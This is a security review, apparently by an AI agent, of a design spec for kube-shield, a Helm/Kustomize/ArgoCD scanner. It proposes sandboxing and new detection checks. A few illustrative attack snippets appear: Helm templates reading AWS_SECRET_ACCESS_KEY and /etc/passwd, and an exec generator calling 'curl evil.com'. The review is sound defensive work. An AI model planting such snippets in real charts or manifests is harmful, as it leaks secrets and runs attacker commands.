# kube-shield Design Spec Security Review

**Spec**: `/tmp/tekton-guard/docs/specs/2026-06-26-kube-shield-rename-design.md`
**Reviewer**: Security review agent (R2)
**Date**: 2026-06-26

---

## Finding 1: `helm template` on untrusted charts is a code execution vector

**Severity**: CRITICAL

**What's wrong**: The Helm parser design (Section "Helm Parser Design", step 3) calls `helm template` to render templates before scanning rendered manifests. `helm template` evaluates Go template functions including `lookup` (queries live cluster), arbitrary sprig functions (`env`, `expandenv` which read host environment variables), and plugin-provided template functions. On Helm 2 or with certain plugins, chart hooks can execute arbitrary code. Running `helm template` against an untrusted chart directory is functionally equivalent to running untrusted code: a malicious chart can exfiltrate environment variables via `{{ env "AWS_SECRET_ACCESS_KEY" }}` embedded in a template output value, or use `{{ .Files.Get "/etc/passwd" }}` to read files from the scanning host.

The spec says "Fallback: if helm CLI is not available, skip step 3" but does not address the safety of step 3 itself.

**Recommendation**: Never run `helm template` on untrusted input without sandboxing. Options:
1. Run `helm template` inside a container/sandbox with no network, no host filesystem access, and stripped environment variables.
2. Use `--no-hooks` flag and override the environment to prevent `env`/`expandenv` leaks.
3. Parse `.tpl` files statically (step 4 in the spec) as the primary path, not the fallback. Static regex-based template analysis is safer than execution.
4. Document a threat model explicitly: if the chart is from a trusted repo, `helm template` is acceptable. If from an untrusted repo, static-only scanning must be enforced.

---

## Finding 2: Missing Helm checks for chart hooks, post-render, and subchart abuse

**Severity**: HIGH

**What's wrong**: The HLM-* check list covers dependencies, image tags, injection, and secrets but misses several Helm-specific attack surfaces:

1. **Chart hooks** (`pre-install`, `post-install`, `pre-upgrade`, `pre-delete`): Hooks run Jobs/Pods automatically during `helm install/upgrade`. A malicious hook can run arbitrary containers before the main workload, often with escalated privileges. No HLM check detects dangerous hooks.
2. **Post-render scripts**: Helm supports `--post-renderer` which pipes rendered YAML through an arbitrary executable. If charts are configured to expect post-renderers, this is a code execution path.
3. **Subchart privilege escalation**: A parent chart can override subchart values (including securityContext, serviceAccount) via its own values.yaml. HLM-PIN-001 checks dependency pinning, but nothing validates that subchart value overrides don't escalate privileges.
4. **`.Files.Get` / `.Files.Glob` in templates**: Templates can embed arbitrary files from the chart directory. A malicious chart can use this to include obfuscated payloads.
5. **`lookup` function**: Templates using `{{ lookup }}` query the live cluster API. While `helm template` doesn't execute lookups (returns empty), `helm install` does, creating a runtime TOCTOU gap between what was scanned and what runs.

**Recommendation**: Add checks:
- `HLM-HOOK-001` (HIGH): Chart contains pre/post-install/upgrade/delete hooks that create Pods or Jobs.
- `HLM-INJ-002` (MEDIUM): Template uses `.Files.Get` or `.Files.Glob` to embed file content.
- `HLM-INJ-003` (MEDIUM): Template uses `lookup` function (scan-time vs install-time divergence).
- `HLM-INJ-004` (HIGH): Template uses `env` or `expandenv` sprig functions.

---

## Finding 3: Kustomize checks miss critical injection vectors

**Severity**: HIGH

**What's wrong**: The KST-* check list has only 4 checks and misses the most dangerous Kustomize-specific attack surfaces:

1. **ConfigMapGenerator / SecretGenerator with file sources**: `configMapGenerator` and `secretGenerator` can reference files via `files:` field. If the referenced file path is outside the kustomization directory (path traversal), or if the generator creates a ConfigMap with embedded scripts that are later mounted and executed, this is an injection path.
2. **Replacement patches (replacements:)**: Kustomize `replacements:` can copy values from any field of any resource to any other field. A malicious replacement can copy a benign-looking annotation value into a container command, image field, or environment variable. This is a data-flow injection vector unique to Kustomize.
3. **`helmCharts:` in kustomization.yaml**: Kustomize can render Helm charts inline via the `helmCharts:` field, combining the risks of both Helm template execution and Kustomize patching. No check covers this.
4. **Components** (`components:`): Kustomize components can be remote-sourced and apply patches. Same trust/pinning concerns as remote bases but not covered.
5. **`patchesJson6902`**: JSON patches can add/replace any field including securityContext, volumes, env vars. Only `patchesStrategicMerge` is checked (KST-PATCH-001).

**Recommendation**: Add checks:
- `KST-GEN-001` (MEDIUM): ConfigMapGenerator or SecretGenerator with external file source paths.
- `KST-REPL-001` (HIGH): Replacement patch that targets container spec fields (command, args, image, env) from untrusted source fields.
- `KST-HELM-001` (HIGH): Kustomization uses `helmCharts:` (triggers Helm template rendering with all associated risks).
- `KST-PIN-003` (HIGH): Component reference without SHA pin.
- `KST-PATCH-002` (MEDIUM): JSON patch that modifies securityContext or volumeMounts.

---

## Finding 4: ArgoCD checks ignore project-level RBAC, credential exposure, and ApplicationSet

**Severity**: HIGH

**What's wrong**: The AGO-* checks focus on Application-level sync policy and pinning but ignore several critical ArgoCD-specific attack surfaces:

1. **AppProject restrictions**: ArgoCD security fundamentally depends on `AppProject` resource configuration. An `Application` pointing to the `default` project has no restrictions on source repos, destination namespaces, or cluster resources. No check validates whether the Application references a restrictive AppProject.
2. **Cluster credential scope**: Applications with `spec.destination.server: https://kubernetes.default.svc` (in-cluster) or wildcard server patterns get broad access. Combined with `default` project, this means full cluster access.
3. **ApplicationSet**: ArgoCD `ApplicationSet` resources dynamically generate Applications from templates. A misconfigured ApplicationSet generator (Git, SCM, Pull Request) can create Applications pointing to attacker-controlled repos. This is the ArgoCD equivalent of a supply chain injection and the spec doesn't mention ApplicationSet at all.
4. **Sync windows bypassed**: ArgoCD supports sync windows to prevent deployments during certain periods. No check validates this.
5. **Resource allow/deny lists**: AppProjects can restrict which Kubernetes resource kinds are allowed. An Application in a permissive project can deploy RBAC resources (ClusterRoleBindings), admission webhooks, or CRDs. No check for this.
6. **Retry policy abuse**: `spec.syncPolicy.retry` with aggressive settings and no limit can cause resource exhaustion.

**Recommendation**: Add checks:
- `AGO-PROJ-001` (CRITICAL): Application uses the `default` AppProject.
- `AGO-PROJ-002` (HIGH): Application references an AppProject that allows wildcard source repos (`*`) or destination namespaces (`*`).
- `AGO-APPSET-001` (HIGH): ApplicationSet with SCM or PullRequest generator (auto-creates Applications from external sources).
- `AGO-CRED-001` (MEDIUM): Application destination is in-cluster with a permissive project.

---

## Finding 5: K8S-* promotion from TKN-* will create duplicate findings with kube-linter

**Severity**: MEDIUM

**What's wrong**: The spec's scope table (Section "Identity and Scope") explicitly marks "Privileged containers, hostPath mounts" as covered by both kube-shield and kube-linter. The K8S-SEC-001/002 and K8S-VOL-001/002 checks fire on any K8s manifest, which means every Deployment, DaemonSet, and StatefulSet in a repo will be scanned by both tools. For teams already running kube-linter in CI, this creates:

1. Duplicate findings that erode developer trust (the same privileged container flagged twice with different rule IDs).
2. Conflicting severity assessments (kube-linter may rate the same issue differently).
3. Maintenance burden: teams need to maintain suppressions in both tools.

The spec acknowledges this overlap in the table but provides no deduplication strategy.

**Recommendation**:
1. When `--type generic` is used (scanning arbitrary K8s manifests), emit K8S-SEC/VOL checks by default.
2. When scanning Helm/Kustomize/ArgoCD rendered output, emit K8S-SEC/VOL only if `--include-k8s-hygiene` is explicitly passed.
3. Add a `kube_linter_compat: true` config option that suppresses checks that overlap with kube-linter's built-in checks, avoiding duplicate noise.
4. At minimum, document the intended interaction so users can configure `skip_checks` in `.kube-shield.yaml`.

---

## Finding 6: Trust model doesn't scale across 4 source types

**Severity**: HIGH

**What's wrong**: The current trust model uses two flat lists: `trusted_git_sources` (URL prefixes) and `trusted_registries` (image prefix). The spec mentions extending this to Helm repos and Kustomize bases but provides no concrete design. Scaling problems:

1. **Helm repos are not git repos**: OCI-based Helm repos use `oci://` scheme. HTTP Helm repos use index.yaml-based discovery. Neither maps cleanly to the `trusted_git_sources` prefix match. The `is_trusted_git_source()` method does `.rstrip("/").removesuffix(".git")` normalization which is git-specific and won't correctly handle `oci://quay.io/charts/` or `https://charts.example.com`.
2. **Kustomize remote bases use git+path**: A Kustomize remote base looks like `https://github.com/org/repo//path/to/dir?ref=v1.0`. The trust check needs to match the repo portion but ignore the path and query parameters. The current prefix matching would require the trust list to include every possible path variation.
3. **ArgoCD repoURL can be SSH or HTTPS**: ArgoCD Application `spec.source.repoURL` can be `git@github.com:org/repo.git` or `https://github.com/org/repo.git`. The current normalizer strips `.git` suffix but doesn't handle SSH-to-HTTPS canonicalization.
4. **No per-source-type trust lists**: A Helm chart repo should probably have its own trust list separate from git sources, since the security implications differ.

**Recommendation**: Redesign the config to have per-source-type trust:
```yaml
trust:
  git_sources: [...]
  helm_repos: [...]    # Supports https:// and oci:// 
  oci_registries: [...]
  kustomize_bases: [...] # With path-stripping normalization
```
Add a URL canonicalization layer that handles SSH-to-HTTPS conversion, path stripping for Kustomize URLs, and OCI scheme handling. Validate this with test cases covering all 4 source types.

---

## Finding 7: HLM-INJ-001 injection check is insufficient for Go template injection

**Severity**: HIGH

**What's wrong**: HLM-INJ-001 is described as detecting "Unsafe `.Values` interpolation in templates (e.g., `{{ .Values.name }}` in shell commands without `quote`)". This is too narrow:

1. **`tpl` function**: Helm's `tpl` function renders a string as a template. `{{ tpl .Values.userInput . }}` allows arbitrary template execution if `userInput` is attacker-controlled. This is the most dangerous Helm injection pattern and is not mentioned.
2. **`printf` without quoting**: `{{ printf "%s" .Values.name }}` in a ConfigMap that becomes a shell script is equally dangerous.
3. **Nested template includes**: `{{ include "mychart.fullname" . }}` where the named template itself interpolates values unsafely. Static analysis of individual templates misses cross-template injection chains.
4. **`toYaml` / `toJson` without proper indentation**: Can break YAML structure and inject additional fields.
5. **The `quote` check is fragile**: Checking for the absence of `quote` doesn't catch cases where `quote` is applied but the context is not shell (e.g., SQL, YAML inline, JSON), or where `squote` is used incorrectly.

**Recommendation**: HLM-INJ-001 should be expanded or split into sub-checks:
- `HLM-INJ-001a`: `.Values.*` interpolated in shell context without `quote`.
- `HLM-INJ-001b`: `tpl` function used with `.Values` input (CRITICAL severity, this is template injection).
- `HLM-INJ-001c`: `.Values.*` interpolated in YAML value context without `toYaml | nindent`.
- Build a simple data-flow analysis that traces `.Values` through `include`/`define` to detect cross-template injection.

---

## Finding 8: No check for Kustomize `kustomize build` execution safety

**Severity**: MEDIUM

**What's wrong**: The Kustomize parser design (step 4) says "Optionally run `kustomize build` for rendered manifest K8S-* checks". Similar to the `helm template` issue, `kustomize build` on untrusted input has risks:

1. **Remote base fetching**: `kustomize build` fetches remote bases (git clone) during build. If the trust check runs after build, the tool has already cloned and processed untrusted repos.
2. **Exec KRM functions**: Kustomize supports exec-based KRM functions (`generators:` and `transformers:` with `exec` runtime) that run arbitrary executables. A malicious kustomization.yaml can specify `generators: [{exec: {command: ["/bin/sh", "-c", "curl evil.com"]}}]`.
3. **Container KRM functions**: Even container-based KRM functions execute containers, which may have network access.

**Recommendation**:
1. Run static analysis (steps 1-3) before any `kustomize build` execution.
2. If `kustomize build` is needed, use `--enable-exec=false` and `--network=false` flags.
3. Add `KST-EXEC-001` (CRITICAL): Kustomization uses exec-based KRM function generator or transformer.
4. Document that `kustomize build` on untrusted input requires sandboxing.

---

## Finding 9: Missing check for Helm chart provenance and signature verification

**Severity**: MEDIUM

**What's wrong**: Helm 3.8+ supports chart provenance via Sigstore/cosign signatures. The spec has no check for whether chart dependencies have provenance files or signature verification enabled. This is directly analogous to TKN-CHAIN-001/002 (Tekton Chains readiness) which checks for SLSA provenance, but the Helm equivalent is absent.

**Recommendation**: Add:
- `HLM-CHAIN-001` (MEDIUM): Chart dependency without `.prov` provenance file or cosign signature.
- `HLM-CHAIN-002` (LOW): `Chart.yaml` does not specify `annotations.artifacthub.io/signKey` or equivalent provenance metadata.

---

## Finding 10: Auto-detection heuristic can be fooled or produce wrong source type

**Severity**: MEDIUM

**What's wrong**: The source type auto-detection table maps directory/file patterns to source types. Problems:

1. **Priority conflicts**: A repository can contain both `Chart.yaml` and `kustomization.yaml` (a Kustomize overlay that wraps a Helm chart via `helmCharts:`). The spec doesn't define priority or how to handle mixed-type repositories.
2. **Spoofing**: If kube-shield is used as a CI gate on pull requests, an attacker could add a `Chart.yaml` to a Tekton-only repo to force the tool into Helm parsing mode, potentially bypassing Tekton-specific checks.
3. **ArgoCD detection by Kind**: Detecting ArgoCD by looking for `Application` kind in YAML is fragile. Custom resources from other projects may also use `Application` as their kind. The detection should check `apiVersion: argoproj.io/v1alpha1` alongside the kind.

**Recommendation**:
1. Define explicit priority order for mixed repos, or scan all detected types and merge findings.
2. When `--type` is not specified, scan for ALL matching types rather than picking one, to prevent bypass.
3. ArgoCD detection must validate both `kind: Application` AND `apiVersion: argoproj.io/v1alpha1`.

---

## Finding 11: HLM-SECRET-002 "encryption-at-rest annotation" is not a Helm security primitive

**Severity**: LOW

**What's wrong**: HLM-SECRET-002 checks for "Secret resource without encryption-at-rest annotation". Encryption at rest for Kubernetes Secrets is a cluster-level EncryptionConfiguration concern, not an annotation on the Secret resource. There is no standard annotation that controls encryption-at-rest behavior. This check appears to conflate:
- SOPS/sealed-secrets annotations (which indicate the secret was encrypted before being committed to git).
- Kubernetes etcd encryption-at-rest (which is a cluster setting, not per-resource).

If the intent is to check for secrets that should be encrypted via SOPS or Sealed Secrets before being stored in git, the check name and description should reflect that.

**Recommendation**: Rename to `HLM-SECRET-002: Unencrypted Secret in chart templates (no SOPS/SealedSecret annotations)`. Check for the presence of `sops:` metadata or `sealedsecrets.bitnami.com/` annotations. Alternatively, flag any `kind: Secret` with plaintext `data:` or `stringData:` in chart templates, since secrets in Helm charts should typically come from external secret management (ExternalSecrets, Vault).

---

## Finding 12: No consideration of `kube-shield` running in CI with elevated permissions

**Severity**: MEDIUM

**What's wrong**: The spec describes kube-shield as a CI gate tool but doesn't address the security posture of kube-shield itself when running in CI:

1. If `helm template` or `kustomize build` is executed during CI, the CI runner needs `helm` and `kustomize` CLIs installed. The scanning tool is now a supply chain component itself. A compromised `helm` binary on the CI runner would be invisible to all checks.
2. The tool processes untrusted YAML from pull requests. YAML deserialization vulnerabilities (while less common in Python's ruamel.yaml than in PyYAML's unsafe loader) are a concern when processing attacker-controlled input at scale.
3. Cross-repo resolver (mentioned in the context) fetches external repository content during scanning. If running on PR content, the resolver could be directed to fetch from attacker-controlled URLs.

**Recommendation**: Document a threat model for kube-shield as a CI component:
1. Pin the `helm` and `kustomize` CLI versions used during scanning.
2. Validate that ruamel.yaml safe loader is used (it already is: `YAML(typ="safe")` in config.py, but the parser uses `YAML()` without `typ="safe"`).
3. Cross-repo resolver should respect the same trust lists as the checks themselves. Do not fetch from URLs that would fail `TRUST-*` checks.
